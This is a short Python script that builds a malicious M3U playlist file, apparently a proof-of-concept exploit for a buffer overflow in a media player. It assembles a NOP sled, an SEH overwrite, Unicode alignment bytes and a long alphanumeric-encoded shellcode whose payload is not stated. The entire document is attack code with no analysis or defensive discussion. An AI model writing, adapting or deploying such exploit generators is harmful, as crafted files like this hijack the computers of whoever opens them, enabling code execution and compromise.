#!/usr/bin/python

filename="exploit.m3u"

seh ="\x41\x71"+"\xF2\x41"

align = (
"\x55"
"\x71"
"\x58"
"\x71"
"\x05\x20\x11"
"\x71"
"\x2d\x17\x11"
"\x71"
"\x50"
"\x71"
"\xC3")

shellcode="PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLYXSRKPKPKP1P4I9UNQWPQTDKPPP04KQBLL4KR2LT4KBRO8LO87OZMVNQKOVLOLQQSLKRNLMPWQXOLMKQY7YRKB1B0WTK0RLPTKPJOLTK0LLQRXZCQ8KQXQ0QTKQIMPKQYCDKOYMH9SNZOY4K04TKM18VP1KOFLWQXOLMKQ8GP8K0BUKFKSSMJXOK3MO4SEZDB8TK28MTKQ8S1VTKLLPKTKB8MLM1XS4KKT4KKQZ0SYPDO4MT1KQKQQPY0ZPQKOYP1OQOQJDKLRJK4MQMS8P3P2KPKP2H3GD3OB1OPTS80LSGO6LGKOJ5H8TPKQKPKPO97TPTPP38O93PRKKPKOHU20200PR0OP20OPPPS8JJLOYOK0KOHU4WRJLEQXGP6HQE502HKRKPKQGKTIIVQZLPPVQGS8V9UUSDQQKOJ5CUWPBTLLKOPNLH45JLRHJPGEG2PVKOYE38QS2M34M0DIYSB727PWNQL6RJN2R9QF9RKMQVHGOTMTOLKQKQ4MOTNDLPWVM014R4PPPVR6PVPF0VPNB6PV0SR61XRY8LOO4FKOXUSY9PPN1FQ6KONP1XM857MMS0KO8UGKJPX56B0V38UVTUWM5MKOJ5OLLF3LKZSPKKYP2UKUWKOWMCRRBOQZM0R3KO8UA"

filler ="\x58"*117

full=seh+align+filler+shellcode
buffer = "\x90"*536+full+"B"*(4466-len(full))
textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
